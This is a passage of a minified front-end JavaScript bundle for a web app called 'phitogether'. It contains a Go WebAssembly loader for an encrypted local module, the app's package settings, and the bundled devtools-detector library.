var Ye=Object.defineProperty;var Ge=(e,t,n)=>t in e?Ye(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n;var He=(e,t,n)=>(Ge(e,typeof t!="symbol"?t+"":t,n),n);(function(){const t=document.createElement("link").relList;if(t&&t.supports&&t.supports("modulepreload"))return;for(const r of document.querySelectorAll('link[rel="modulepreload"]'))s(r);new MutationObserver(r=>{for(const o of r)if(o.type==="childList")for(const l of o.addedNodes)l.tagName==="LINK"&&l.rel==="modulepreload"&&s(l)}).observe(document,{childList:!0,subtree:!0});function n(r){const o={};return r.integrity&&(o.integrity=r.integrity),r.referrerPolicy&&(o.referrerPolicy=r.referrerPolicy),r.crossOrigin==="use-credentials"?o.credentials="include":r.crossOrigin==="anonymous"?o.credentials="omit":o.credentials="same-origin",o}function s(r){if(r.ep)return;r.ep=!0;const o=n(r);fetch(r.href,o)}})();const style="",background="",pzEncrypted="/assets/pzEncrypted-372581de.wasm";(()=>{if(!(typeof global<"u"))if(typeof window<"u")window.global=window;else if(typeof self<"u")self.global=self;else throw new Error("cannot export Go (neither global, window nor self is defined)");!global.require&&typeof require<"u"&&(global.require=require),!global.fs&&global.require&&(global.fs=require("fs"));const e=()=>{const r=new Error("not implemented");return r.code="ENOSYS",r};if(!global.fs){let r="";global.fs={constants:{O_WRONLY:-1,O_RDWR:-1,O_CREAT:-1,O_TRUNC:-1,O_APPEND:-1,O_EXCL:-1},writeSync(o,l){r+=n.decode(l);const d=r.lastIndexOf(`
`);return d!=-1&&(console.log(r.substr(0,d)),r=r.substr(d+1)),l.length},write(o,l,d,u,f,m){if(d!==0||u!==l.length||f!==null){m(e());return}const g=this.writeSync(o,l);m(null,g)},chmod(o,l,d){d(e())},chown(o,l,d,u){u(e())},close(o,l){l(e())},fchmod(o,l,d){d(e())},fchown(o,l,d,u){u(e())},fstat(o,l){l(e())},fsync(o,l){l(null)},ftruncate(o,l,d){d(e())},lchown(o,l,d,u){u(e())},link(o,l,d){d(e())},lstat(o,l){l(e())},mkdir(o,l,d){d(e())},open(o,l,d,u){u(e())},read(o,l,d,u,f,m){m(e())},readdir(o,l){l(e())},readlink(o,l){l(e())},rename(o,l,d){d(e())},rmdir(o,l){l(e())},stat(o,l){l(e())},symlink(o,l,d){d(e())},truncate(o,l,d){d(e())},unlink(o,l){l(e())},utimes(o,l,d,u){u(e())}}}if(global.process||(global.process={getuid(){return-1},getgid(){return-1},geteuid(){return-1},getegid(){return-1},getgroups(){throw e()},pid:-1,ppid:-1,umask(){throw e()},cwd(){throw e()},chdir(){throw e()}}),!global.crypto){const r=require("crypto");global.crypto={getRandomValues(o){r.randomFillSync(o)}}}global.performance||(global.performance={now(){const[r,o]=process.hrtime();return r*1e3+o/1e6}}),global.TextEncoder||(global.TextEncoder=require("util").TextEncoder),global.TextDecoder||(global.TextDecoder=require("util").TextDecoder);const t=new TextEncoder("utf-8"),n=new TextDecoder("utf-8");var s=[];global.Go=class{constructor(){this._callbackTimeouts=new Map,this._nextCallbackTimeoutID=1;const r=()=>new DataView(this._inst.exports.memory.buffer),o=(y,v)=>{r().setUint32(y+0,v,!0),r().setUint32(y+4,Math.floor(v/4294967296),!0)},l=y=>{const v=r().getFloat64(y,!0);if(v===0)return;if(!isNaN(v))return v;const x=r().getUint32(y,!0);return this._values[x]},d=(y,v)=>{if(typeof v=="number"){if(isNaN(v)){r().setUint32(y+4,2146959360,!0),r().setUint32(y,0,!0);return}if(v===0){r().setUint32(y+4,2146959360,!0),r().setUint32(y,1,!0);return}r().setFloat64(y,v,!0);return}switch(v){case void 0:r().setFloat64(y,0,!0);return;case null:r().setUint32(y+4,2146959360,!0),r().setUint32(y,2,!0);return;case!0:r().setUint32(y+4,2146959360,!0),r().setUint32(y,3,!0);return;case!1:r().setUint32(y+4,2146959360,!0),r().setUint32(y,4,!0);return}let E=this._ids.get(v);E===void 0&&(E=this._idPool.pop(),E===void 0&&(E=this._values.length),this._values[E]=v,this._goRefCounts[E]=0,this._ids.set(v,E)),this._goRefCounts[E]++;let S=1;switch(typeof v){case"string":S=2;break;case"symbol":S=3;break;case"function":S=4;break}r().setUint32(y+4,2146959360|S,!0),r().setUint32(y,E,!0)},u=(y,v,x)=>new Uint8Array(this._inst.exports.memory.buffer,y,v),f=(y,v,x)=>{const E=new Array(v);for(let S=0;S<v;S++)E[S]=l(y+S*8);return E},m=(y,v)=>n.decode(new DataView(this._inst.exports.memory.buffer,y,v)),g=Date.now()-performance.now();this.importObject={wasi_snapshot_preview1:{fd_write:function(y,v,x,E){let S=0;if(y==1)for(let w=0;w<x;w++){let k=v+w*8,C=r().getUint32(k+0,!0),R=r().getUint32(k+4,!0);S+=R;for(let L=0;L<R;L++){let O=r().getUint8(C+L);if(O!=13)if(O==10){let I=n.decode(new Uint8Array(s));s=[],console.log(I)}else s.push(O)}}else console.error("invalid file descriptor:",y);return r().setUint32(E,S,!0),0},fd_close:()=>0,fd_fdstat_get:()=>0,fd_seek:()=>0,proc_exit:y=>{if(global.process)process.exit(y);else throw"trying to exit with code "+y},random_get:(y,v)=>(crypto.getRandomValues(u(y,v)),0)},env:{"runtime.ticks":()=>g+performance.now(),"runtime.sleepTicks":y=>{setTimeout(this._inst.exports.go_scheduler,y)},"syscall/js.finalizeRef":y=>{},"syscall/js.stringVal":(y,v,x)=>{const E=m(v,x);d(y,E)},"syscall/js.valueGet":(y,v,x,E)=>{let S=m(x,E),w=l(v),k=Reflect.get(w,S);d(y,k)},"syscall/js.valueSet":(y,v,x,E)=>{const S=l(y),w=m(v,x),k=l(E);Reflect.set(S,w,k)},"syscall/js.valueDelete":(y,v,x)=>{const E=l(y),S=m(v,x);Reflect.deleteProperty(E,S)},"syscall/js.valueIndex":(y,v,x)=>{d(y,Reflect.get(l(v),x))},"syscall/js.valueSetIndex":(y,v,x)=>{Reflect.set(l(y),v,l(x))},"syscall/js.valueCall":(y,v,x,E,S,w,k)=>{const C=l(v),R=m(x,E),L=f(S,w);try{const O=Reflect.get(C,R);d(y,Reflect.apply(O,C,L)),r().setUint8(y+8,1)}catch(O){d(y,O),r().setUint8(y+8,0)}},"syscall/js.valueInvoke":(y,v,x,E,S)=>{try{const w=l(v),k=f(x,E,S);d(y,Reflect.apply(w,void 0,k)),r().setUint8(y+8,1)}catch(w){d(y,w),r().setUint8(y+8,0)}},"syscall/js.valueNew":(y,v,x,E,S)=>{const w=l(v),k=f(x,E);try{d(y,Reflect.construct(w,k)),r().setUint8(y+8,1)}catch(C){d(y,C),r().setUint8(y+8,0)}},"syscall/js.valueLength":y=>l(y).length,"syscall/js.valuePrepareString":(y,v)=>{const x=String(l(v)),E=t.encode(x);d(y,E),o(y+8,E.length)},"syscall/js.valueLoadString":(y,v,x,E)=>{const S=l(y);u(v,x).set(S)},"syscall/js.valueInstanceOf":(y,v)=>l(y)instanceof l(v),"syscall/js.copyBytesToGo":(y,v,x,E,S)=>{let w=y,k=y+4;const C=u(v,x),R=l(S);if(!(R instanceof Uint8Array||R instanceof Uint8ClampedArray)){r().setUint8(k,0);return}const L=R.subarray(0,C.length);C.set(L),o(w,L.length),r().setUint8(k,1)},"syscall/js.copyBytesToJS":(y,v,x,E,S)=>{let w=y,k=y+4;const C=l(v),R=u(x,E);if(!(C instanceof Uint8Array||C instanceof Uint8ClampedArray)){r().setUint8(k,0);return}const L=R.subarray(0,C.length);C.set(L),o(w,L.length),r().setUint8(k,1)}}}}async run(r){for(this._inst=r,this._values=[NaN,0,null,!0,!1,global,this],this._goRefCounts=[],this._ids=new Map,this._idPool=[],this.exited=!1,new DataView(this._inst.exports.memory.buffer);;){const o=new Promise(l=>{this._resolveCallbackPromise=()=>{if(this.exited)throw new Error("bad callback: Go program has already exited");setTimeout(l,0)}});if(this._inst.exports._start(),this.exited)break;await o}}_resume(){if(this.exited)throw new Error("Go program has already exited");this._inst.exports.resume(),this.exited&&this._resolveExitPromise()}_makeFuncWrapper(r){const o=this;return function(){const l={id:r,this:this,args:arguments};return o._pendingEvent=l,o._resume(),l.result}}}})();WebAssembly.instantiateStreaming||(WebAssembly.instantiateStreaming=async(e,t)=>await WebAssembly.instantiate(await(await e).arrayBuffer(),t));{const e=new Go;WebAssembly.instantiateStreaming(fetch(pzEncrypted),e.importObject).then(t=>e.run(t.instance)).catch(t=>console.error(t))}const name="phitogether",version$1="2.1.0t0",type="module",scripts={dev:"vite --port 1145",build:"vite build && node ./script/build.js",build4dev:"vite build && node ./script/build4dev.js",preview:"vite preview"},dependencies={"@types/node":"^20.8.0","devtools-detector":"^2.0.14","file-saver":"^2.0.5",md5:"^2.3.0",notiflix:"^3.2.6","stackblur-canvas":"^2.6.0",vue:"^3.3.4","vue-i18n":"^9.5.0","vue-router":"^4.2.5"},devDependencies={"@vitejs/plugin-vue":"^4.2.3",vite:"^4.4.9"},pnpm={patchedDependencies:{"notiflix@3.2.6":"patches/notiflix@3.2.6.patch"}},packageConfig={name,private:!0,version:version$1,type,scripts,dependencies,devDependencies,pnpm};document.title+=` ${window.spec.thisVersion=packageConfig.version}`;var commonjsGlobal=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function getDefaultExportFromCjs(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var devtoolsDetector={exports:{}};(function(e,t){(function(n,s){e.exports=s()})(typeof self<"u"?self:commonjsGlobal,function(){return function(n){var s={};function r(o){if(s[o])return s[o].exports;var l=s[o]={i:o,l:!1,exports:{}};return n[o].call(l.exports,l,l.exports,r),l.l=!0,l.exports}return r.m=n,r.c=s,r.d=function(o,l,d){r.o(o,l)||Object.defineProperty(o,l,{configurable:!1,enumerable:!0,get:d})},r.n=function(o){var l=o&&o.__esModule?function(){return o.default}:function(){return o};return r.d(l,"a",l),l},r.o=function(o,l){return Object.prototype.hasOwnProperty.call(o,l)},r.p="",r(r.s=3)}([function(n,s,r){r.d(s,"j",function(){return y}),r.d(s,"e",function(){return v}),r.d(s,"f",function(){return x}),r.d(s,"d",function(){return E}),r.d(s,"i",function(){return S}),r.d(s,"g",function(){return w}),r.d(s,"c",function(){return k}),r.d(s,"h",function(){return C}),s.a=function(){for(var L,O=[],I=0;I<arguments.length;I++)O[I]=arguments[I];return g!=null&&g.document?(L=g.document).createElement.apply(L,O):{}},r.d(s,"b",function(){return R});var o,l,d,u,f,m=r(1),g=Object(m.a)(),y=((o=g==null?void 0:g.navigator)===null||o===void 0?void 0:o.userAgent)||"unknown",v="InstallTrigger"in((g==null?void 0:g.window)||{})||/firefox/i.test(y),x=/trident/i.test(y)||/msie/i.test(y),E=/edge/i.test(y),S=/webkit/i.test(y)&&!E,w=/IqiyiApp/.test(y),k=((l=g==null?void 0:g.window)===null||l===void 0?void 0:l.chrome)!==void 0||/chrome/i.test(y)||/CriOS/i.test(y),C=(((u=(d=g==null?void 0:g.window)===null||d===void 0?void 0:d.safari)===null||u===void 0?void 0:u.pushNotification)||!1).toString()==="[object SafariRemoteNotification]"||/safari/i.test(y)&&!k,R=typeof((f=g.document)===null||f===void 0?void 0:f.createElement)=="function"},function(n,s,r){(function(o){s.c=function(){return typeof performance<"u"?performance.now():Date.now()},s.b=function(u){u===void 0&&(u={});for(var f=u.includes,m=f===void 0?[]:f,g=u.excludes,y=g===void 0?[]:g,v=!1,x=!1,E=0,S=m;E<S.length;E++){var w=S[E];if(w===!0){v=!0;break}}for(var k=0,C=y;k<C.length;k++){var w=C[k];if(w===!0){x=!0;break}}return v&&!x},s.d=function(u,f,m){var g=d.a[u];return g===void 0?!1:Object(l.compare)(g,f,m)},s.a=function(){return typeof self<"u"?self:typeof window<"u"?window:o!==void 0?o:this};var l=r(8),d=(r.n(l),r(4))}).call(s,r(7))},function(n,s,r){r.d(s,"b",function(){return d}),r.d(s,"c",function(){return u}),r.d(s,"a",function(){return f});var o=r(0);function l(m){if(console){if(!o.f&&!o.d)return console[m];if(m==="log"||m==="clear")return function(){for(var g=[],y=0;y<arguments.length;y++)g[y]=arguments[y];console[m].apply(console,g)}}return function(){for(var g=[],y=0;y<arguments.length;y++)g[y]=arguments[y]}}var d=l("log"),u=l("table"),f=l("clear")},function(n,s,r){Object.defineProperty(s,"__esModule",{value:!0}),s.addListener=function(v){y.addListener(v)},s.removeListener=function(v){y.removeListener(v)},s.isLaunch=function(){return y.isLaunch()},s.launch=function(){y.launch()},s.stop=function(){y.stop()},s.setDetectDelay=function(v){y.setDetectDelay(v)};var o=r(6),l=r(9);r.d(s,"DevtoolsDetector",function(){return o.a}),r.d(s,"checkers",function(){return l});var d=r(1);r.d(s,"match",function(){return d.b}),r.d(s,"specificVersionMatch",function(){return d.d});var u=r(0);r.d(s,"userAgent",function(){return u.j}),r.d(s,"isFirefox",function(){return u.e}),r.d(s,"isIE",function(){return u.f}),r.d(s,"isEdge",function(){return u.d}),r.d(s,"isWebkit",function(){return u.i}),r.d(s,"isIqiyiApp",function(){return u.g}),r.d(s,"isChrome",function(){return u.c}),r.d(s,"isSafari",function(){return u.h}),r.d(s,"createElement",function(){return u.a}),r.d(s,"inBrowser",function(){return u.b});var f=r(2);r.d(s,"log",function(){return f.b}),r.d(s,"table",function(){return f.c}),r.d(s,"clear",function(){return f.a});var m=r(4);r.d(s,"versionMap",function(){return m.a});var g=r(5);r.d(s,"isMac",function(){return g.d}),r.d(s,"isIpad",function(){return g.b}),r.d(s,"isIphone",function(){return g.c}),r.d(s,"isAndroid",function(){return g.a}),r.d(s,"isWindows",function(){return g.e});var y=new o.a({checkers:[l.erudaChecker,l.elementIdChecker,l.regToStringChecker,l.functionToStringChecker,l.depRegToStringChecker,l.dateToStringChecker,l.performanceChecker,l.debuggerChecker]});s.default=y},function(n,s,r){r.d(s,"a",function(){return o});for(var o={},l=0,d=(r(0).j||"").match(/\w+\/(\d|\.)+(\s|$)/gi)||[];l<d.length;l++){var u=d[l].split("/"),f=u[0],m=u[1];o[f]=m}},function(n,s,r){r.d(s,"d",function(){return l}),r.d(s,"b",function(){return d}),r.d(s,"c",function(){return u}),r.d(s,"a",function(){return f}),r.d(s,"e",function(){return m});var o=r(0),l=/macintosh/i.test(o.j),d=/ipad/i.test(o.j)||l&&navigator.maxTouchPoints>1,u=/iphone/i.test(o.j),f=/android/i.test(o.j),m=/windows/i.test(o.j)},function(n,s,r){r.d(s,"a",function(){return u});var o=r(0),l=this&&this.__awaiter||function(f,m,g,y){return new(g||(g=Promise))(function(v,x){function E(k){try{w(y.next(k))}catch(C){x(C)}}function S(k){try{w(y.throw(k))}catch(C){x(C)}}function w(k){k.done?v(k.value):function(C){return C instanceof g?C:new g(function(R){R(C)})}(k.value).then(E,S)}w((y=y.apply(f,m||[])).next())})},d=this&&this.__generator||function(f,m){var g,y,v,x,E={label:0,sent:function(){if(1&v[0])throw v[1];return v[1]},trys:[],ops:[]};return x={next:S(0),throw:S(1),return:S(2)},typeof Symbol=="function"&&(x[Symbol.iterator]=function(){return this}),x;function S(w){return function(k){return function(C){if(g)throw new TypeError("Generator is already executing.");for(;E;)try{if(g=1,y&&(v=2&C[0]?y.return:C[0]?y.throw||((v=y.return)&&v.call(y),0):y.next)&&!(v=v.call(y,C[1])).done)return v;switch(y=0,v&&(C=[2&C[0],v.value]),C[0]){case 0:case 1:v=C;break;case 4:return E.label++,{value:C[1],done:!1};case 5:E.label++,y=C[1],C=[0];continue;case 7:C=E.ops.pop(),E.trys.pop();continue;default:if(!(v=(v=E.trys).length>0&&v[v.length-1])&&(C[0]===6||C[0]===2)){E=0;continue}if(C[0]===3&&(!v||C[1]>v[0]&&C[1]<v[3])){E.label=C[1];break}if(C[0]===6&&E.label<v[1]){E.label=v[1],v=C;break}if(v&&E.label<v[2]){E.label=v[2],E.ops.push(C);break}v[2]&&E.ops.pop(),E.trys.pop();continue}C=m.call(f,E)}catch(R){C=[6,R],y=0}finally{g=v=0}if(5&C[0])throw C[1];return{value:C[0]?C[1]:void 0,done:!0}}([w,k])}}},u=function(){function f(m){var g=m.checkers;this._listeners=[],this._isOpen=!1,this._detectLoopStopped=!0,this._detectLoopDelay=500,this._checkers=g.slice()}return f.prototype.launch=function(){o.b&&(this._detectLoopDelay<=0&&this.setDetectDelay(500),this._detectLoopStopped&&(this._detectLoopStopped=!1,this._detectLoop()))},f.prototype.stop=function(){this._detectLoopStopped||(this._detectLoopStopped=!0,clearTimeout(this._timer))},f.prototype.isLaunch=function(){return!this._detectLoopStopped},f.prototype.setDetectDelay=function(m){this._detectLoopDelay=m},f.prototype.addListener=function(m){this._listeners.push(m)},f.prototype.removeListener=function(m){this._listeners=this._listeners.filter(function(g){return g!==m})},f.prototype._broadcast=function(m){for(var g=0,y=this._listeners;g<y.length;g++){var v=y[g];try{v(m.isOpen,m)}catch{}}},f.prototype._detectLoop=function(){return l(this,void 0,void 0,function(){var m,g,y,v,x,E=this;return d(this,function(S){switch(S.label){case 0:m=!1,g="",y=0,v=this._checkers,S.label=1;case 1:return y<v.length?[4,(x=v[y]).isEnable()]:[3,6];case 2:return S.sent()?(g=x.name,[4,x.isOpen()]):[3,4];case 3:m=S.sent(),S.label=4;case 4:if(m)return[3,6];S.label=5;case 5:return y++,[3,1];case 6:return m!=this._isOpen&&(this._isOpen=m,this._broadcast({isOpen:m,checkerName:g})),this._detectLoopDelay>0&&!this._detectLoopStopped?this._timer=setTimeout(function(){return E._detectLoop()},this._detectLoopDelay):this.stop(),[2]}})})},f}()},function(n,s){var r;r=function(){return this}();try{r=r||Function("return this")()||(0,eval)("this")}catch{typeof window=="object"&&(r=window)}n.exports=r},function(n,s,r){var o,l,d;(function(u,f){l=[],(d=typeof(o=f)=="function"?o.apply(s,l):o)===void 0||(n.exports=d)})(0,function(){var u=/^v?(?:\d+)(\.(?:[x*]|\d+)(\.(?:[x*]|\d+)(\.(?:[x*]|\d+))?(?:-[\da-z\-]+(?:\.[\da-z\-]+)*)?(?:\+[\da-z\-]+(?:\.[\da-z\-]+)*)?)?)?$/i;function f(E){var S=E.replace(/^v/,"").replace(/\+.*$/,""),w=function(C,R){return C.indexOf(R)===-1?C.length:C.indexOf(R)}(S,"-"),k=S.substring(0,w).split(".");return k.push(S.substring(w+1)),k}function m(E){return isNaN(Number(E))?E:Number(E)}function g(E){if(typeof E!="string")throw new TypeError("Invalid argument expected string");if(!u.test(E))throw new Error("Invalid argument not valid semver ('"+E+"' received)")}function y(E,S){[E,S].forEach(g);for(var w=f(E),k=f(S),C=0;C<Math.max(w.length-1,k.length-1);C++){var R=parseInt(w[C]||0,10),L=parseInt(k[C]||0,10);if(R>L)return 1;if(L>R)return-1}var O=w[w.length-1],I=k[k.length-1];if(O&&I){var A=O.split(".").map(m),j=I.split(".").map(m);for(C=0;C<Math.max(A.length,j.length);C++){if(A[C]===void 0||typeof j[C]=="string"&&typeof A[C]=="number")return-1;if(j[C]===void 0||typeof A[C]=="string"&&typeof j[C]=="number"||A[C]>j[C])return 1;if(j[C]>A[C])return-1}}else if(O||I)return O?-1:1;return 0}var v=[">",">=","=","<","<="],x={">":[1],">=":[0,1],"=":[0],"<=":[-1,0],"<":[-1]};return y.validate=function(E){return typeof E=="string"&&u.test(E)},y.compare=function(E,S,w){(function(C){if(typeof C!="string")throw new TypeError("Invalid operator type, expected string but got "+typeof C);if(v.indexOf(C)===-1)throw new TypeError("Invalid operator, expected one of "+v.join("|"))})(w);var k=y(E,S);return x[w].indexOf(k)>-1},y})},function(n,s,r){Object.defineProperty(s,"__esModule",{value:!0});var o=r(10);r.d(s,"depRegToStringChecker",function(){return o.a});var l=r(11);r.d(s,"elementIdChecker",function(){return l.a});var d=r(12);r.d(s,"functionToStringChecker",function(){return d.a});var u=r(13);r.d(s,"regToStringChecker",function(){return u.a});var f=r(14);r.d(s,"debuggerChecker",function(){return f.a});var m=r(15);r.d(s,"dateToStringChecker",function(){return m.a});var g=r(16);r.d(s,"performanceChecker",function(){return g.a});var y=r(17);r.d(s,"erudaChecker",function(){return y.a})},function(n,s,r){r.d(s,"a",function(){return y});var o=r(0),l=r(2),d=r(1),u=this&&this.__awaiter||function(v,x,E,S){return new(E||(E=Promise))(function(w,k){function C(O){try{L(S.next(O))}catch(I){k(I)}}function R(O){try{L(S.throw(O))}catch(I){k(I)}}function L(O){O.done?w(O.value):function(I){return I instanceof E?I:new E(function(A){A(I)})}(O.value).then(C,R)}L((S=S.apply(v,x||[])).next())})},f=this&&this.__generator||function(v,x){var E,S,w,k,C={label:0,sent:function(){if(1&w[0])throw w[1];return w[1]},trys:[],ops:[]};return k={next:R(0),throw:R(1),return:R(2)},typeof Symbol=="function"&&(k[Symbol.iterator]=function(){return this}),k;function R(L){return function(O){return function(I){if(E)throw new TypeError("Generator is already executing.");for(;C;)try{if(E=1,S&&(w=2&I[0]?S.return:I[0]?S.throw||((w=S.return)&&w.call(S),0):S.next)&&!(w=w.call(S,I[1])).done)return w;switch(S=0,w&&(I=[2&I[0],w.value]),I[0]){case 0:case 1:w=I;break;case 4:return C.label++,{value:I[1],done:!1};case 5:C.label++,S=I[1],I=[0];continue;case 7:I=C.ops.pop(),C.trys.pop();continue;default:if(!(w=(w=C.trys).length>0&&w[w.length-1])&&(I[0]===6||I[0]===2)){C=0;continue}if(I[0]===3&&(!w||I[1]>w[0]&&I[1]<w[3])){C.label=I[1];break}if(I[0]===6&&C.label<w[1]){C.label=w[1],w=I;break}if(w&&C.label<w[2]){C.label=w[2],C.ops.push(I);break}w[2]&&C.ops.pop(),C.trys.pop();continue}I=x.call(v,C)}catch(A){I=[6,A],S=0}finally{E=w=0}if(5&I[0])throw I[1];return{value:I[0]?I[1]:void 0,done:!0}}([L,O])}}},m=/ /,g=!1;m.toString=function(){return g=!0,y.name};var y={name:"dep-reg-to-string",isOpen:function(){return u(this,void 0,void 0,function(){return f(this,function(v){return g=!1,Object(l.c)({dep:m}),Object(l.a)(),[2,g]})})},isEnable:function(){return u(this,void 0,void 0,function(){return f(this,function(v){return[2,Object(d.b)({includes:[!0],excludes:[o.e,o.f]})]})})}}},function(n,s,r){r.d(s,"a",function(){return y});var o=r(0),l=r(2),d=r(1),u=this&&this.__awaiter||function(v,x,E,S){return new(E||(E=Promise))(function(w,k){function C(O){try{L(S.next(O))}catch(I){k(I)}}function R(O){try{L(S.throw(O))}catch(I){k(I)}}function L(O){O.done?w(O.value):function(I){return I instanceof E?I:new E(function(A){A(I)})}(O.value).then(C,R)}L((S=S.apply(v,x||[])).next())})},f=this&&this.__generator||function(v,x){var E,S,w,k,C={label:0,sent:function(){if(1&w[0])throw w[1];return w[1]},trys:[],ops:[]};return k={next:R(0),throw:R(1),return:R(2)},typeof Symbol=="function"&&(k[Symbol.iterator]=function(){return this}),k;function R(L){return function(O){return function(I){if(E)throw new TypeError("Generator is already executing.");for(;C;)try{if(E=1,S&&(w=2&I[0]?S.return:I[0]?S.throw||((w=S.return)&&w.call(S),0):S.next)&&!(w=w.call(S,I[1])).done)return w;switch(S=0,w&&(I=[2&I[0],w.value]),I[0]){case 0:case 1:w=I;break;case 4:return C.label++,{value:I[1],done:!1};case 5:C.label++,S=I[1],I=[0];continue;case 7:I=C.ops.pop(),C.trys.pop();continue;default:if(!(w=(w=C.trys).length>0&&w[w.length-1])&&(I[0]===6||I[0]===2)){C=0;continue}if(I[0]===3&&(!w||I[1]>w[0]&&I[1]<w[3])){C.label=I[1];break}if(I[0]===6&&C.label<w[1]){C.label=w[1],w=I;break}if(w&&C.label<w[2]){C.label=w[2],C.ops.push(I);break}w[2]&&C.ops.pop(),C.trys.pop();continue}I=x.call(v,C)}catch(A){I=[6,A],S=0}finally{E=w=0}if(5&I[0])throw I[1];return{value:I[0]?I[1]:void 0,done:!0}}([L,O])}}},m=Object(o.a)("div"),g=!1;Object.defineProperty(m,"id",{get:function(){return g=!0,y.name},configurable:!0});var y={name:"element-id",isOpen:function(){return u(this,void 0,void 0,function(){return f(this,function(v){return g=!1,Object(l.b)(m),Object(l.a)(),[2,g]})})},isEnable:function(){return u(this,void 0,void 0,function(){return f(this,function(v){return[2,Object(d.b)({includes:[!0],excludes:[o.f,o.d,o.e]})]})})}}},function(n,s,r){r.d(s,"a",function(){return v});var o=r(0),l=r(2),d=r(5),u=r(1),f=this&&this.__awaiter||function(x,E,S,w){return new(S||(S=Promise))(function(k,C){function R(I){try{O(w.next(I))}catch(A){C(A)}}function L(I){try{O(w.throw(I))}catch(A){C(A)}}function O(I){I.done?k(I.value):function(A){return A instanceof S?A:new S(function(j){j(A)})}(I.value).then(R,L)}O((w=w.apply(x,E||[])).next())})},m=this&&this.__generator||function(x,E){var S,w,k,C,R={label:0,sent:function(){if(1&k[0])throw k[1];return k[1]},trys:[],ops:[]};return C={next:L(0),throw:L(1),return:L(2)},typeof Symbol=="function"&&(C[Symbol.iterator]=function(){return this}),C;function L(O){return function(I){return function(A){if(S)throw new TypeError("Generator is already executing.");for(;R;)try{if(S=1,w&&(k=2&A[0]?w.return:A[0]?w.throw||((k=w.return)&&k.call(w),0):w.next)&&!(k=k.call(w,A[1])).done)return k;switch(w=0,k&&(A=[2&A[0],k.value]),A[0]){case 0:case 1:k=A;break;case 4:return R.label++,{value:A[1],done:!1};case 5:R.label++,w=A[1],A=[0];continue;case 7:A=R.ops.pop(),R.trys.pop();continue;default:if(!(k=(k=R.trys).length>0&&k[k.length-1])&&(A[0]===6||A[0]===2)){R=0;continue}if(A[0]===3&&(!k||A[1]>k[0]&&A[1]<k[3])){R.label=A[1];break}if(A[0]===6&&R.label<k[1]){R.label=k[1],k=A;break}if(k&&R.label<k[2]){R.label=k[2],R.ops.push(A);break}k[2]&&R.ops.pop(),R.trys.pop();continue}A=E.call(x,R)}catch(j){A=[6,j],w=0}finally{S=k=0}if(5&A[0])throw A[1];return{value:A[0]?A[1]:void 0,done:!0}}([O,I])}}};function g(){}var y=0;g.toString=function(){return y++,""};var v={name:"function-to-string",isOpen:function(){return f(this,void 0,void 0,function(){return m(this,function(x){return y=0,Object(l.b)(g),Object(l.a)(),[2,y===2]})})},isEnable:function(){return f(this,void 0,void 0,function(){return m(this,function(x){return[2,Object(u.b)({includes:[!0],excludes:[o.g,o.e,(d.b||d.c)&&o.c]})]})})}}},function(n,s,r){r.d(s,"a",function(){return y});var o=r(2),l=r(0),d=r(1),u=this&&this.__awaiter||function(v,x,E,S){return new(E||(E=Promise))(function(w,k){function C(O){try{L(S.next(O))}catch(I){k(I)}}function R(O){try{L(S.throw(O))}catch(I){k(I)}}function L(O){O.done?w(O.value):function(I){return I instanceof E?I:new E(function(A){A(I)})}(O.value).then(C,R)}L((S=S.apply(v,x||[])).next())})},f=this&&this.__generator||function(v,x){var E,S,w,k,C={label:0,sent:function(){if(1&w[0])throw w[1];return w[1]},trys:[],ops:[]};return k={next:R(0),throw:R(1),return:R(2)},typeof Symbol=="function"&&(k[Symbol.iterator]=function(){return this}),k;function R(L){return function(O){return function(I){if(E)throw new TypeError("Generator is already executing.");for(;C;)try{if(E=1,S&&(w=2&I[0]?S.return:I[0]?S.throw||((w=S.return)&&w.call(S),0):S.next)&&!(w=w.call(S,I[1])).done)return w;switch(S=0,w&&(I=[2&I[0],w.value]),I[0]){case 0:case 1:w=I;break;case 4:return C.label++,{value:I[1],done:!1};case 5:C.label++,S=I[1],I=[0];continue;case 7:I=C.ops.pop(),C.trys.pop();continue;default:if(!(w=(w=C.trys).length>0&&w[w.length-1])&&(I[0]===6||I[0]===2)){C=0;continue}if(I[0]===3&&(!w||I[1]>w[0]&&I[1]<w[3])){C.label=I[1];break}if(I[0]===6&&C.label<w[1]){C.label=w[1],w=I;break}if(w&&C.label<w[2]){C.label=w[2],C.ops.push(I);break}w[2]&&C.ops.pop(),C.trys.pop();continue}I=x.call(v,C)}catch(A){I=[6,A],S=0}finally{E=w=0}if(5&I[0])throw I[1];return{value:I[0]?I[1]:void 0,done:!0}}([L,O])}}},m=/ /,g=!1;m.toString=function(){return g=!0,y.name};var y={name:"reg-to-string",isOpen:function(){return u(this,void 0,void 0,function(){return f(this,function(v){return g=!1,Object(o.b)(m),Object(o.a)(),[2,g]})})},isEnable:function(){return u(this,void 0,void 0,function(){return f(this,function(v){return[2,Object(d.b)({includes:[!0],excludes:[l.i]})]})})}}},function(n,s,r){r.d(s,"a",function(){return u});var o=r(1),l=this&&this.__awaiter||function(f,m,g,y){return new(g||(g=Promise))(function(v,x){function E(k){try{w(y.next(k))}catch(C){x(C)}}function S(k){try{w(y.throw(k))}catch(C){x(C)}}function w(k){k.done?v(k.value):function(C){return C instanceof g?C:new g(function(R){R(C)})}(k.value).then(E,S)}w((y=y.apply(f,m||[])).next())})},d=this&&this.__generator||function(f,m){var g,y,v,x,E={label:0,sent:function(){if(1&v[0])throw v[1];return v[1]},trys:[],ops:[]};return x={next:S(0),throw:S(1),return:S(2)},typeof Symbol=="function"&&(x[Symbol.iterator]=function(){return this}),x;function S(w){return function(k){return function(C){if(g)throw new TypeError("Generator is already executing.");for(;E;)try{if(g=1,y&&(v=2&C[0]?y.return:C[0]?y.throw||((v=y.return)&&v.call(y),0):y.next)&&!(v=v.call(y,C[1])).done)return v;switch(y=0,v&&(C=[2&C[0],v.value]),C[0]){case 0:case 1:v=C;break;case 4:return E.label++,{value:C[1],done:!1};case 5:E.label++,y=C[1],C=[0];continue;case 